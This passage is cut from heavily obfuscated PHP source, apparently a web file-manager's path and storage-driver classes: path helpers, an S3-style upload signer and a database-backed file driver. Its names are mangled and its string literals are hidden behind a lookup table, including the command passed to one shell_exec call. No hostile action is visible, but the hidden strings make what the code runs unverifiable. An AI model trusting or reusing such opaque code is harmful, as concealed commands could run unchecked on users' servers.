makeShare($÷Õ£­ÁÛ, $åÂ¬à•Ü) { return self::makePath(self::KOD_SHARE_ITEM, $÷Õ£­ÁÛ, $åÂ¬à•Ü); } public static function makeFileTypePath($½ãŒƒŸó) { return self::makePath(self::KOD_USER_FILE_TYPE, $½ãŒƒŸó); } public static function makeFileTagPath($°Ìàæşæ) { return self::makePath(self::KOD_USER_FILE_TAG, $°Ìàæşæ); } public static function makePath($êÖéïÔ, $†Ëß×ëí = '', $ĞÛº¥‚ = '') { $»éÌÍ•ê =& $_SERVER[ßğøİ]; $ªƒÔÛ¦ = substr($êÖéïÔ, 1, -1); $Ú˜œÒÒ = $»éÌÍ•ê[1271] . $ªƒÔÛ¦ . $»éÌÍ•ê[1272] . $†Ëß×ëí . $»éÌÍ•ê[1273]; $Ú˜œÒÒ = $ĞÛº¥‚ ? $Ú˜œÒÒ . $ĞÛº¥‚ . $»éÌÍ•ê[8] : $Ú˜œÒÒ; return $Ú˜œÒÒ; } public static function hashPath($ÇÖ„ö‚Œ, $Û¾¨ÄÇ = true) { $ùëÑÁ… =& $_SERVER[ßğøİ]; $‚”Îü = is_array($ÇÖ„ö‚Œ) ? $ÇÖ„ö‚Œ : IO::info($ÇÖ„ö‚Œ); $…ÊÁË®û = _get($‚”Îü, $ùëÑÁ…[1274], $ùëÑÁ…[12]); if (!$…ÊÁË®û && isset($‚”Îü[$ùëÑÁ…[402]])) { $‚”Îü = IO::info(KodIO::make($‚”Îü[$ùëÑÁ…[402]])); $…ÊÁË®û = _get($‚”Îü, $ùëÑÁ…[1274], $ùëÑÁ…[12]); } if (!$…ÊÁË®û && $Û¾¨ÄÇ) { $»¹¶âıè = KodIO::parse($‚”Îü[$ùëÑÁ…[84]]); if (!$»¹¶âıè[$ùëÑÁ…[33]]) { $…ÊÁË®û = IO::hashSimple($‚”Îü[$ùëÑÁ…[84]]); } } if (!$…ÊÁË®û) { $…ÊÁË®û = md5($‚”Îü[$ùëÑÁ…[84]] . $‚”Îü[$ùëÑÁ…[76]] . $‚”Îü[$ùëÑÁ…[85]]); } return $…ÊÁË®û; } public static function initSystemPath() { $Ô¸¦µ¨‡ =& $_SERVER[ßğøİ]; if (defined($Ô¸¦µ¨‡[1275])) { return; } define($Ô¸¦µ¨‡[1275], self::systemPath($Ô¸¦µ¨‡[1276])); define($Ô¸¦µ¨‡[1277], self::systemPath($Ô¸¦µ¨‡[1278])); define($Ô¸¦µ¨‡[1279], self::systemPath($Ô¸¦µ¨‡[1280])); define($Ô¸¦µ¨‡[1281], self::systemPath($Ô¸¦µ¨‡[1282])); IOHistory::bindEvent(); } public static function systemPath($Ä‚­ë¿‘) { $á ”ŸÀÔ =& $_SERVER[ßğøİ]; $”²ø§²ö = $á ”ŸÀÔ[1283] . ucfirst($Ä‚­ë¿‘); $†‹”ø‚ = Model($á ”ŸÀÔ[767])->get($”²ø§²ö); if ($†‹”ø‚) { return $†‹”ø‚; } if ($Ä‚­ë¿‘ == $á ”ŸÀÔ[1276]) { $†‹”ø‚ = self::make(Model($á ”ŸÀÔ[822])->systemRootPathAdd($á ”ŸÀÔ[544])); } else { $†‹”ø‚ = self::systemPath($á ”ŸÀÔ[1276]); $ÚöŒİ‘á = self::sourceID($†‹”ø‚); $†‹”ø‚ = self::make(Model($á ”ŸÀÔ[822])->mkdir($ÚöŒİ‘á, $Ä‚­ë¿‘)); } Model($á ”ŸÀÔ[767])->set($”²ø§²ö, $†‹”ø‚); return $†‹”ø‚; } public static function systemFolder($‚…ËÀ¬Ã) { $œô¹ÎÔÌ = IO_PATH_SYSTEM_SOURCE . $‚…ËÀ¬Ã; $Ë°ØüÄ = Cache::get($œô¹ÎÔÌ); if (!$Ë°ØüÄ) { $ªÚ¦ï = IO::infoFull($œô¹ÎÔÌ); if (!$ªÚ¦ï) { $Ë°ØüÄ = IO::mkdir($œô¹ÎÔÌ, REPEAT_SKIP); } else { $Ë°ØüÄ = $ªÚ¦ï[$_SERVER[ßğøİ][84]]; } Cache::set($œô¹ÎÔÌ, $Ë°ØüÄ, 3600 * 10); } return $Ë°ØüÄ; } public static function defaultDriver() { return Model($_SERVER[ßğøİ][764])->defaultDriver(); } public static function defaultIO() { $Á¢¨âŒÍ =& $_SERVER[ßğøİ]; $—¬£ã±× = self::defaultDriver(); return $Á¢¨âŒÍ[1284] . $—¬£ã±×[$Á¢¨âŒÍ[399]] . $Á¢¨âŒÍ[1273]; } public static function defaultDriverInit() { static $Úêœ˜„Ü = false; if ($Úêœ˜„Ü) { return $Úêœ˜„Ü; } $Úêœ˜„Ü = IO::init(self::defaultIO()); return $Úêœ˜„Ü; } public static function fileTypeList() { $­¹õ»œˆ =& $_SERVER[ßğøİ]; $á¥¶Ñ´ş = $GLOBALS[$­¹õ»œˆ[6]][$­¹õ»œˆ[1285]]; foreach ($á¥¶Ñ´ş as $ŠÙ˜ÀÑé => $‹‘’şØÛ) { $‹öƒ—· = $­¹õ»œˆ[1286] . $ŠÙ˜ÀÑé; $¹¢İîƒº = LNG($‹öƒ—·); if ($‹öƒ—· != $¹¢İîƒº) { $á¥¶Ñ´ş[$ŠÙ˜ÀÑé][$­¹õ»œˆ[32]] = $¹¢İîƒº; } } return $á¥¶Ñ´ş; } public static function diskList($£ààÛÁæ = true) { $®ğå‚± = $_SERVER[ßğøİ][1287]; if ($£ààÛÁæ) { $§ààÎùê = Cache::get($®ğå‚±); if (is_array($§ààÎùê)) { return $§ààÎùê; } } $§ààÎùê = self::diskListGet(); Cache::set($®ğå‚±, $§ààÎùê, 60); return $§ààÎùê; } public static function diskListGet() { $½Óë‹” =& $_SERVER[ßğøİ]; $ÉÈÉ¦úÏ = array(); if ($GLOBALS[$½Óë‹”[6]][$½Óë‹”[1288]] == $½Óë‹”[1289]) { $ïŸÁ ‰« = $½Óë‹”[1290]; for ($†¶ÜÑú… = 0; $†¶ÜÑú… < strlen($ïŸÁ ‰«); $†¶ÜÑú…++) { $ãĞËÂª = $ïŸÁ ‰«[$†¶ÜÑú…] . $½Óë‹”[1291]; if (file_exists($ãĞËÂª)) { $ÉÈÉ¦úÏ[] = $ãĞËÂª; } } return $ÉÈÉ¦úÏ; } if (!function_exists($½Óë‹”[98])) { $ÉÈÉ¦úÏ[] = $½Óë‹”[832]; return $ÉÈÉ¦úÏ; } $¤î„ ®® = explode($½Óë‹”[231], shell_exec($½Óë‹”[1292])); array_shift($¤î„ ®®); array_pop($¤î„ ®®); $µïÏÂå = array($½Óë‹”[1293], $½Óë‹”[1294], $½Óë‹”[1295], $½Óë‹”[1296], $½Óë‹”[1297], $½Óë‹”[1298], $½Óë‹”[1299], $½Óë‹”[1300]); foreach ($¤î„ ®® as $àºÖˆÙ) { $—•ô‰ñü = preg_split($½Óë‹”[1301], $àºÖˆÙ); $ãĞËÂª = $—•ô‰ñü[count($—•ô‰ñü) - 1]; if (!strstr($—•ô‰ñü[0], $½Óë‹”[1302]) || !$ãĞËÂª) { continue; } $Èõ—¬û = rtrim($ãĞËÂª, $½Óë‹”[8]) . $½Óë‹”[8]; if (in_array($Èõ—¬û, $µïÏÂå)) { continue; } $ÉÈÉ¦úÏ[] = $Èõ—¬û; } return $ÉÈÉ¦úÏ; } public static function isSameDisk($à×Êİüƒ, $–ËúÙ’¡) { $–Ñß„Ù =& $_SERVER[ßğøİ]; if ($GLOBALS[$–Ñß„Ù[6]][$–Ñß„Ù[1288]] == $–Ñß„Ù[1289]) { return strtolower(substr($à×Êİüƒ, 0, 1)) == strtolower(substr($–ËúÙ’¡, 0, 1)); } $ÇÂÎæ× = self::diskList(); $ÈøÒåÜ¨ = !1; $“é¡Ê = !1; sort($ÇÂÎæ×); $ÇÂÎæ× = array_reverse($ÇÂÎæ×); $à×Êİüƒ = rtrim($à×Êİüƒ, $–Ñß„Ù[8]) . $–Ñß„Ù[8]; $–ËúÙ’¡ = rtrim($–ËúÙ’¡, $–Ñß„Ù[8]) . $–Ñß„Ù[8]; foreach ($ÇÂÎæ× as $¸Ş¹«»ª) { $£’°Ùï = strlen($¸Ş¹«»ª); if (!$ÈøÒåÜ¨ && substr($à×Êİüƒ, 0, $£’°Ùï) == $¸Ş¹«»ª) { $ÈøÒåÜ¨ = $¸Ş¹«»ª; } if (!$“é¡Ê && substr($–ËúÙ’¡, 0, $£’°Ùï) == $¸Ş¹«»ª) { $“é¡Ê = $¸Ş¹«»ª; } if ($ÈøÒåÜ¨ && $“é¡Ê) { break; } } return $ÈøÒåÜ¨ === $“é¡Ê; } public static function transferType($º¢ŒÏØ±, $ÊüÕö‘Ë) { $¼ëº¡Ê =& $_SERVER[ßğøİ]; $–¾•—İ³ = self::driverType($º¢ŒÏØ±); $ˆèÑ¥¤ß = self::driverType($ÊüÕö‘Ë); if ($–¾•—İ³[$¼ëº¡Ê[33]] == $ˆèÑ¥¤ß[$¼ëº¡Ê[33]] && $–¾•—İ³[$¼ëº¡Ê[1303]] == $ˆèÑ¥¤ß[$¼ëº¡Ê[1303]]) { return $¼ëº¡Ê[1304]; } if ($–¾•—İ³[$¼ëº¡Ê[33]] == $¼ëº¡Ê[861] && $ˆèÑ¥¤ß[$¼ëº¡Ê[33]] == $¼ëº¡Ê[106]) { return $¼ëº¡Ê[1199]; } if ($–¾•—İ³[$¼ëº¡Ê[33]] == $¼ëº¡Ê[106] && $ˆèÑ¥¤ß[$¼ëº¡Ê[33]] == $¼ëº¡Ê[861]) { return $¼ëº¡Ê[107]; } return $¼ëº¡Ê[1305]; } public static function driverType($©•€æ‰ë) { $ğåÓº÷ô =& $_SERVER[ßğøİ]; $íÆÇÑÅã = str_replace($ğåÓº÷ô[1306], $ğåÓº÷ô[12], strtolower($©•€æ‰ë->getType())); if ($íÆÇÑÅã == $ğåÓº÷ô[755] || $íÆÇÑÅã == $ğåÓº÷ô[1307] || $íÆÇÑÅã == $ğåÓº÷ô[1308]) { $©•€æ‰ë = self::defaultDriverInit(); } else { if ($íÆÇÑÅã == $ğåÓº÷ô[1206] || $íÆÇÑÅã == $ğåÓº÷ô[1309]) { $©•€æ‰ë = IO::init($©•€æ‰ë->pathParse[$ğåÓº÷ô[1151]]); } } $ˆÚñµ…Ï = $©•€æ‰ë->path; $íÆÇÑÅã = str_replace($ğåÓº÷ô[1306], $ğåÓº÷ô[12], strtolower($©•€æ‰ë->getType())); if ($íÆÇÑÅã == $ğåÓº÷ô[106]) { return array($ğåÓº÷ô[33] => $ğåÓº÷ô[106], $ğåÓº÷ô[1303] => $ğåÓº÷ô[12], $ğåÓº÷ô[84] => $ˆÚñµ…Ï); } return array($ğåÓº÷ô[33] => $ğåÓº÷ô[861], $ğåÓº÷ô[1303] => $©•€æ‰ë->pathDriver, $ğåÓº÷ô[84] => $ˆÚñµ…Ï); } public static function pathDriverType($Ô¸Õ¡İ’) { return $Ô¸Õ¡İ’ ? self::driverType(IO::init($Ô¸Õ¡İ’)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($İ³å ”±) { parent::__construct($İ³å ”±); $this->signatureVersion($_SERVER[ßğøİ][216]); } public function uploadFormData($ŸÌ—´àÄ, $™ÛÕÜâñ = 3600) { $ŠÚøèÏñ =& $_SERVER[ßğøİ]; $İÙØš¼ù = $ŠÚøèÏñ[198]; $À¸òšœş = $ŠÚøèÏñ[232]; $‚ŞúÈİµ = $ŠÚøèÏñ[1310]; $å‡Âîœ… = gmdate($ŠÚøèÏñ[1311], time() + $™ÛÕÜâñ); $ıîÉâæ› = (string) time() . $ŠÚøèÏñ[71] . (string) (time() + $™ÛÕÜâñ); $ˆ¡—²åü = array($ŠÚøèÏñ[1312] => $å‡Âîœ…, $ŠÚøèÏñ[1313] => array(array($ŠÚøèÏñ[1314] => $İÙØš¼ù), array($ŠÚøèÏñ[1315] => $this->bucket), array($ŠÚøèÏñ[1316], $ŠÚøèÏñ[1317], $ŠÚøèÏñ[12]), array($ŠÚøèÏñ[1318] => $‚ŞúÈİµ), array($ŠÚøèÏñ[1319] => $À¸òšœş), array($ŠÚøèÏñ[1320] => $this->accessKey), array($ŠÚøèÏñ[1321] => $ıîÉâæ›))); $ˆ¡—²åü = json_encode($ˆ¡—²åü); $ áÕâŞ¡ = hash_hmac($ŠÚøèÏñ[232], $ıîÉâæ›, $this->secret); $…ü‚æé³ = sha1($ˆ¡—²åü); $ËñÓİİ¾ = hash_hmac($ŠÚøèÏñ[232], $…ü‚æé³, $ áÕâŞ¡); $÷¸Ñ™½Æ = array($ŠÚøèÏñ[1314] => $İÙØš¼ù, $ŠÚøèÏñ[1318] => $‚ŞúÈİµ, $ŠÚøèÏñ[1322] => base64_encode($ˆ¡—²åü), $ŠÚøèÏñ[1319] => $À¸òšœş, $ŠÚøèÏñ[1320] => $this->accessKey, $ŠÚøèÏñ[1323] => $ıîÉâæ›, $ŠÚøèÏñ[1324] => $ËñÓİİ¾, $ŠÚøèÏñ[181] => $this->getHost()); return $÷¸Ñ™½Æ; } public function fileOutLink($µÔÄ™©…) { $“şìéÛ¥ =& $_SERVER[ßğøİ]; if (substr($µÔÄ™©…, 0, 7) == $“şìéÛ¥[1325]) { $µÔÄ™©… = $“şìéÛ¥[1326] . substr($µÔÄ™©…, 7); } header($“şìéÛ¥[161] . $µÔÄ™©…); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Ü¿Äò’Æ) { $this->pathParse = $Ü¿Äò’Æ; $this->model = Model($_SERVER[ßğøİ][1327]); } public function getPath($šŞƒŞ¬) { return trim($šŞƒŞ¬, $_SERVER[ßğøİ][8]); } public function pathFather($¦§³¿´À) { $òÜú‹Ô· = $this->parse($¦§³¿´À); $òÜú‹Ô· = $this->infoSimple($¦§³¿´À); return $òÜú‹Ô· ? $òÜú‹Ô·[$_SERVER[ßğøİ][432]] : !1; } public function pathThis($ßÜ“Í¤) { $‰º¦ÀŒÍ = $this->infoSimple($ßÜ“Í¤); return $‰º¦ÀŒÍ ? $‰º¦ÀŒÍ[$_SERVER[ßğøİ][32]] : !1; } public function getPathOuter($¼½œ¶í¥) { if (!$¼½œ¶í¥) { return $¼½œ¶í¥; } $ĞáĞ±ƒÑ = $this->parse($¼½œ¶í¥); return KodIO::make($ĞáĞ±ƒÑ[$_SERVER[ßğøİ][399]]); } public function copyFolderFromIO($â¹ˆÌè®, $Œ¹¶ó­¡, $ğü© ²Ç, $¼šé”öĞ, $ëıå™¤¸) { $ÀÕ¢›¶À = $this->model->copyFolderFromIO($â¹ˆÌè®, $Œ¹¶ó­¡, $ğü© ²Ç, $¼šé”öĞ, $ëıå™¤¸); return KodIO::make($ÀÕ¢›¶À); } public function isParentOf($ß¬Äïó, $£ÃùÁê³) { return $this->model->isParentOf($ß¬Äïó, $£ÃùÁê³); } public function mkfile($¨½›Óùå, $¡–ï©ù = '', $Ò²Æ¸É‘ = REPEAT_RENAME) { $ŒØ²×Šå =& $_SERVER[ßğøİ]; $Ù¬æå¤ = $this->parse($¨½›Óùå); $¨½›Óùå = $Ù¬æå¤[$ŒØ²×Šå[399]]; for ($¸¿•·Û› = 0; $¸¿•·Û› < count($Ù¬æå¤[$ŒØ²×Šå[1328]]); $¸¿•·Û›++) { $é¥À‡†İ = $Ù¬æå¤[$ŒØ²×Šå[1328]][$¸¿•·Û›]; if ($¸¿•·Û› == count($Ù¬æå¤[$ŒØ²×Šå[1328]]) - 1) { $¨½›Óùå = $this->model->mkfile($¨½›Óùå, $é¥À‡†İ, $¡–ï©ù, $Ò²Æ¸É‘); break; } $¨½›Óùå = $this->model->mkdir($¨½›Óùå, $é¥À‡†İ, REPEAT_SKIP); } return $this->getPathOuter($¨½›Óùå); } public function mkdir($×Û°¿Ğ…, $¥¾ˆÊ¸´ = REPEAT_SKIP) { $€õ«é”Û =& $_SERVER[ßğøİ]; $Õ¤Óö¶Ÿ = $this->parse($×Û°¿Ğ…); $×Û°¿Ğ… = $Õ¤Óö¶Ÿ[$€õ«é”Û[399]]; for ($´âô†åû = 0; $´âô†åû < count($Õ¤Óö¶Ÿ[$€õ«é”Û[1328]]); $´âô†åû++) { $÷áÖ¯Ëö = $Õ¤Óö¶Ÿ[$€õ«é”Û[1328]][$´âô†åû]; $×Û°¿Ğ… = $this->model->mkdir($×Û°¿Ğ…, $÷áÖ¯Ëö, $¥¾ˆÊ¸´); } return $this->getPathOuter($×Û°¿Ğ…); } public function copyFile($œ¼ë¥ØÁ, $¯Í¥åÁ•, $°©ƒıâö = REPEAT_REPLACE) { $’Ô¦Ì²„ =& $_SERVER[ßğøİ]; $µ•†Ÿ¶ö = $this->parse($¯Í¥åÁ•); $¶µÄåÑ¸ = $this->model->copy($œ¼ë¥ØÁ, $µ•†Ÿ¶ö[$’Ô¦Ì²„[399]], $°©ƒıâö, $µ•†Ÿ¶ö[$’Ô¦Ì²„[84]]); return $¶µÄåÑ¸ ? $this->getPathOuter($¶µÄåÑ¸) : !1; } public function moveFile($­¯Ï§¦ˆ, $˜œ¸ˆµ , $®ûØë° = REPEAT_REPLACE) { $Ğ˜â½é¡ =& $_SERVER[ßğøİ]; $„ÛïÚ¾Š = $this->parse($˜œ¸ˆµ ); $íö‡æûğ = $this->model->move($­¯Ï§¦ˆ, $„ÛïÚ¾Š[$Ğ˜â½é¡[399]], $®ûØë°, $„ÛïÚ¾Š[$Ğ˜â½é¡[84]]); return $íö‡æûğ ? $this->getPathOuter($íö‡æûğ) : !1; } public function copy($Ú¼‘©õ, $¹­¿èŠí, $úõ¯†° = REPEAT_REPLACE, $×ÕØË³ó = false) { $šéÑÈ’ã = $this->parse($¹­¿èŠí); $½â¤à® = $this->model->copy($Ú¼‘©õ, $šéÑÈ’ã[$_SERVER[ßğøİ][399]], $úõ¯†°, $×ÕØË³ó); return $½â¤à® ? $this->getPathOuter($½â¤à®) : !1; } public function moveSameAllow() { } public function move($Ö„ÔˆğÅ, $µûäµ†, $›‹ÏØ„ = REPEAT_REPLACE, $Ãº ¶Áª = false) { $Öşå€ûş = $this->parse($µûäµ†); $ı¡ÒíÛ = $this->model->move($Ö„ÔˆğÅ, $Öşå€ûş[$_SERVER[ßğøİ][399]], $›‹ÏØ„, $Ãº ¶Áª); return $ı¡ÒíÛ ? $this->getPathOuter($ı¡ÒíÛ) : !1; } public function remove($ÉÕµòšı, $˜¸ëÂ Ú = true) { return $this->model->remove($ÉÕµòšı, $˜¸ëÂ Ú); } public function rename($ß´€ˆÑ¹, $â…¤·‚ø) { $³À¾Í× = $this->model->rename($ß´€ˆÑ¹, $â…¤·‚ø); return $³À¾Í× ? $this->getPathOuter($ß´€ˆÑ¹) : $³À¾Í×; } public function size($Ÿ™ôÁî) { $şŒ“«ÜĞ = $this->infoSimple($Ÿ™ôÁî); return $şŒ“«ÜĞ ? $şŒ“«ÜĞ[$_SERVER[ßğøİ][76]] : 0; } public function infoSimple($ÖŸˆ «è) { return $this->model->sourceInfo($ÖŸˆ «è); } public function info($Úî˜Ä’§) { return $this->infoParse($Úî˜Ä’§); } public function infoAuth($àÑëˆ„œ) { return $this->infoParse($àÑëˆ„œ, !1, !0); } public function infoWithChildren($ü¦¢‚ê) { return $this->infoParse($ü¦¢‚ê, !0); } protected function infoParse($Á¾Ù¸‰, $œîÛ•Æ³ = false, $ëÖ•Ú÷Ê = false) { if (!$œîÛ•Æ³) { return $this->model->pathInfo($Á¾Ù¸‰, $ëÖ•Ú÷Ê); } return $this->model->pathInfoMore($Á¾Ù¸‰); } public function infoFull($şõ€êÌ) { $Ã‘ÀËõ™ =& $_SERVER[ßğøİ]; $„Ã¯šæ¡ = explode($Ã‘ÀËõ™[8], $şõ€êÌ); $™ë Ó×® = implode($Ã‘ÀËõ™[8], array_splice($„Ã¯šæ¡, 1)); return $this->model->pathInfoByPath($„Ã¯šæ¡[0], $™ë Ó×®); } public function hashSimple($Œº²·øÑ) { $Û¶¦¸¾¹ =& $_SERVER[ßğøİ]; $·™Óïè = $this->infoWithChildren($Œº²·øÑ); return $·™Óïè[$Û¶¦¸¾¹[170]][$Û¶¦¸¾¹[177]]; } public function hashMd5($®¼È„ õ) { $úùìÂËÈ =& $_SERVER[ßğøİ]; $¥£éüĞ = $this->infoWithChildren($®¼È„ õ); return $¥£éüĞ[$úùìÂËÈ[170]][$úùìÂËÈ[176]]; } public function exist($³ı ¥…ö) { $ºŸ¦ò‚¥ =& $_SERVER[ßğøİ]; $Á’ûèŒ¨ = $this->parse($³ı ¥…ö); if (!$Á’ûèŒ¨[$ºŸ¦ò‚¥[84]]) { return $this->isFile($³ı ¥…ö) || $this->isFolder($³ı ¥…ö); } $ñÅ®ï³ = array($ºŸ¦ò‚¥[401] => $Á’ûèŒ¨[$ºŸ¦ò‚¥[399]], $ºŸ¦ò‚¥[32] => $Á’ûèŒ¨[$ºŸ¦ò‚¥[84]]); $ô·Î™Œ = $this->model->where($ñÅ®ï³)->find(); return $ô·Î™Œ ? !0 : !1; } public function isFile($—Ô¶•¨ó) { $Œ÷šíÊª =& $_SERVER[ßğøİ]; $¼¡æ°ßÆ = $this->infoSimple($—Ô¶•¨ó); return $¼¡æ°ßÆ && $¼¡æ°ßÆ[$Œ÷šíÊª[410]] == $Œ÷šíÊª[88] ? !1 : !0; } public function isFolder($¦¼ÓŒ´) { $üçúÖ© =& $_SERVER[ßğøİ]; $µíÕÄÆ = $this->infoSimple($¦¼ÓŒ´); return $µíÕÄÆ && $µíÕÄÆ[$üçúÖ©[410]] == $üçúÖ©[88] ? !0 : !1; } public function listPath($ıŠ¸Á, $ÑüÂ†Ç = false) { $‚…ÂÚ·ş =& $_SERVER[ßğøİ]; if ($ıŠ¸Á == $‚…ÂÚ·ş[12]) { return !1; } $Î×úáæÂ = array($‚…ÂÚ·ş[401] => $ıŠ¸Á); if ($ÑüÂ†Ç) { return $this->model->listSource($Î×úáæÂ, -1); } return $this->model->listSource($Î×úáæÂ); } public function has($Ôæßåæ‰, $Åè†™× = false, $Ö¨ƒ‡¢‹ = null) { $º–Â êŠ =& $_SERVER[ßğøİ]; $„ÁÄÕµÈ = $this->infoWithChildren($Ôæßåæ‰); if ($Åè†™×) { return array($º–Â êŠ[208] => $„ÁÄÕµÈ[$º–Â êŠ[208]], $º–Â êŠ[207] => $„ÁÄÕµÈ[$º–Â êŠ[207]]); } return $Ö¨ƒ‡¢‹ ? $„ÁÄÕµÈ[$º–Â êŠ[208]] : $„ÁÄÕµÈ[$º–Â êŠ[207]]; } public function listAll($Ó‰éˆâ¼) { $­³œÖı¦ = IO::info($this->pathParse[$_SERVER[ßğøİ][84]]); if (!$­³œÖı¦) { return array(); } return $this->model->listAll($Ó‰éˆâ¼); } public function getContent($ûûÑ¹œ³) { return $this->model->getContent($ûûÑ¹œ³); } public function setContent($Ò»¾ÊòÅ, $Ş ¡ƒ´• = '') { return $this->model->setContent($Ò»¾ÊòÅ, $Ş ¡ƒ´•); } public function fileSubstr($Ó‰Î‰Ğâ, $ÀúÔ«µ», $ÒìÄÀ¨) { return $this->model->fileSubstr($Ó‰Î‰Ğâ, $ÀúÔ«µ», $ÒìÄÀ¨); } public function download($¾€”ó«û, $ù‡òÍ› = '') { $ì³™øıì = get_path_father($ù‡òÍ›); $Ï†Êï©İ = get_path_this($ù‡òÍ›); $€„ô‰êÀ = $this->model->fileInfoGet($¾€”ó«û); $ƒ°ò‰ˆØ = IO::copy($€„ô‰êÀ[$_SERVER[ßğøİ][84]], $ì³™øıì, !1, $Ï†Êï©İ); return $ƒ°ò‰ˆØ; } public function setModifyTime($Šè³º¸š, $©²âËÓø = '') { $·«§ç¥² =& $_SERVER[ßğøİ]; if (!$Šè³º¸š) { return; } $this->model->where(array($·«§ç¥²[417] => $Šè³º¸š))->save(array($·«§ç¥²[85] => $©²âËÓø)); } public function upload($å÷îƒ¦, $œ…›à¿», $ıô¹¿Ô = false, $Ã“Óİ–Ì = REPEAT_REPLACE) { $ÂÄ˜ëäé =& $_SERVER[ßğøİ]; $î¾‹Ã’ƒ = $this->parse($å÷îƒ¦); $åöÆ§ÊŸ = $this->model->addFile($î¾‹Ã’ƒ[$ÂÄ˜ëäé[399]], $œ…›à¿», $î¾‹Ã’ƒ[$ÂÄ˜ëäé[84]], $ıô¹¿Ô, $Ã“Óİ–Ì); return $this->getPathOuter($åöÆ§ÊŸ); } public function uploadFileByID($Î Äß†, $şİû™É, $ÔÃşñ) { $óïú¿¯ =& $_SERVER[ßğøİ]; $Èºã¥ıÔ = $this->parse($Î Äß†); $•ìö©Ûş = $this->model->addFileByFileID($Èºã¥ıÔ[$óïú¿¯[399]], $şİû™É, $Èºã¥ıÔ[$óïú¿¯[84]], $ÔÃşñ); return $this->getPathOuter($•ìö©Ûş); } public function addFileByRemote($å¯ı¢Ä¥, $‰Ç³¡²ú, $’‹Åá½Ò = array(), $¢â¬¡© = '', $ÎÜÏÈ…›) { $ĞÕ¤ŠãÕ =& $_SERVER[ßğøİ]; $®»ëØàË = $this->parse($å¯ı¢Ä¥); $¢â¬¡© = empty($¢â¬¡©) ? $®»ëØàË[$ĞÕ¤ŠãÕ[84]] : $¢â¬¡©; $ıÀöâ› = $this->model->addFileByRemote($®»ëØàË[$ĞÕ¤ŠãÕ[399]], $‰Ç³¡²ú, $¢â¬¡©, $’‹Åá½Ò, $ÎÜÏÈ…›); return $this->getPathOuter($ıÀöâ›); } public function uploadLink($ò½îù—Š, $”úœÚÌ = 0) { $Ìœò¦Š‹ =& $_SERVER[ßğøİ]; $Éª©‰ØÀ = $this->parse($ò½îù—Š); $åíà‰… = _get($GLOBALS[$Ìœò¦Š‹[7]], $Ìœò¦Š‹[1329]); $åòîÖšø = _get($GLOBALS[$Ìœò¦Š‹[7]], $Ìœò¦Š‹[1330]); $ò½îù—Š = Model($Ìœò¦Š‹[609])->createFileName($Éª©‰ØÀ[$Ìœò¦Š‹[84]], $åíà‰…, $åòîÖšø); return IO::uploadLink($ò½îù—Š, $”úœÚÌ); } public function fileNameAuto($Ìª­“ñ, $³¿ıì›©, $ë†Ú¨Ş± = REPEAT_REPLACE, $ÃøóƒÉĞ = false) { return $this->model->fileNameAuto($Ìª­“ñ, $³¿ıì›©, $ë†Ú¨Ş±, $ÃøóƒÉĞ); } public function fileNameExist($‰ê™ñùş, $Åş¼ÓÁ) { return $this->model->fileNameExist($‰ê™ñùş, $Åş¼ÓÁ); } protected function _fileOut($Ÿœ´ëÆÍ, $§´çø„ä = false, $ÈºƒÃ® = false, $´üÆ•‰İ = '', $Ú…Á¢ïÍ = false) { $şÇˆ§¢ =& $_SERVER[ßğøİ]; $Ù™–¶í¶ = $this->model->sourceInfo($Ÿœ´ëÆÍ); if ($Ù™–¶í¶[$şÇˆ§¢[410]] == $şÇˆ§¢[88]) { header($şÇˆ§¢[1331]); die; } $ò¾¯Ï³­ = $this->model->fileInfoGet($Ÿœ´ëÆÍ); $´üÆ•‰İ = $ò¾¯Ï³­[$şÇˆ§¢[176]] ? $ò¾¯Ï³­[$şÇˆ§¢[176]] : $´üÆ•‰İ; $Ùè¹‘ø = isset($GLOBALS[$şÇˆ§¢[1332]]) ? $GLOBALS[$şÇˆ§¢[1332]] : $Ù™–¶í¶[$şÇˆ§¢[32]]; if ($Ú…Á¢ïÍ) { return IO::fileOutServer($ò¾¯Ï³­[$şÇˆ§¢[84]], $§´çø„ä, $Ùè¹‘ø, $´üÆ•‰İ); } IO::fileOut($ò¾¯Ï³­[$şÇˆ§¢[84]], $§´çø„ä, $Ùè¹‘ø, $´üÆ•‰İ); } public function fileOut($ó¾¾Å­­, $òÂÄÉÁÇ = false, $ØàÅÏ‘ = false, $†º¢„ëñ = '') { $this->_fileOut($ó¾¾Å­­, $òÂÄÉÁÇ, $ØàÅÏ‘, $†º¢„ëñ); } public function fileOutServer($›¦¬Á˜ü, $“–¬¸Êú = false, $ÀœÎÇ°û = false, $•ñ”‘¾‚ = '') { $this->_fileOut($›¦¬Á˜ü, $“–¬¸Êú, $ÀœÎÇ°û, $•ñ”‘¾‚, !0); } protected function _fileOutImage($Ñá§Ô¹©, $Ô¬Šãë = 250) { $„¹õúç« =& $_SERVER[ßğøİ]; $ğ®¯™­› = $this->model->pathInfo($Ñá§Ô¹©); if ($ğ®¯™­›[$„¹õúç«[410]] == $„¹õúç«[88]) { show_json($„¹õúç«[1333] . $Ñá§Ô¹©, !1); } $°ãİé¢û = $this->model->fileInfoGet($Ñá§Ô¹©); $°ãİé¢û[$„¹õúç«[32]] = $ğ®¯™­›[$„¹õúç«[32]]; $°ãİé¢û[$„¹õúç«[169]] = $ğ®¯™­›[$„¹õúç«[169]]; $GLOBALS[$„¹õúç«[1332]] = $°ãİé¢û[$„¹õúç«[32]]; $GLOBALS[$„¹õúç«[168]] = $°ãİé¢û; IO::fileOutImage($°ãİé¢û[$„¹õúç«[84]], $Ô¬Šãë); } public function fileOutImage($Ûßİ·Æ, $ŠÔ¾‡— = 250) { $this->_fileOutImage($Ûßİ·Æ, $ŠÔ¾‡—); } public function fileOutImageServer($å¶¹Š·‘, $ƒäßüê§ = 250) { $this->_fileOutImage($å¶¹Š·‘, $ƒäßüê§); } public function link($ó‘³›¦, $³¶ŠÚ…½ = '') { $ç·ãÎ© = $this->model->fileInfoGet($ó‘³›¦); return IO::link($ç·ãÎ©[$_SERVER[ßğøİ][84]], $³¶ŠÚ…½); } protected function parse($‡“‹²íî) { $á¡Ÿİ¿â =& $_SERVER[ßğøİ]; if (strstr($‡“‹²íî, $á¡Ÿİ¿â[8]) === !1) { return array($á¡Ÿİ¿â[419] => intval($‡“‹²íî), $á¡Ÿİ¿â[84] => $á¡Ÿİ¿â[12], $á¡Ÿİ¿â[1328] => array()); } $„’ìŞÉ = explode($á¡Ÿİ¿â[8], trim($‡“‹²íî, $á¡Ÿİ¿â[8])); if (count($„’ìŞÉ) < 2) { 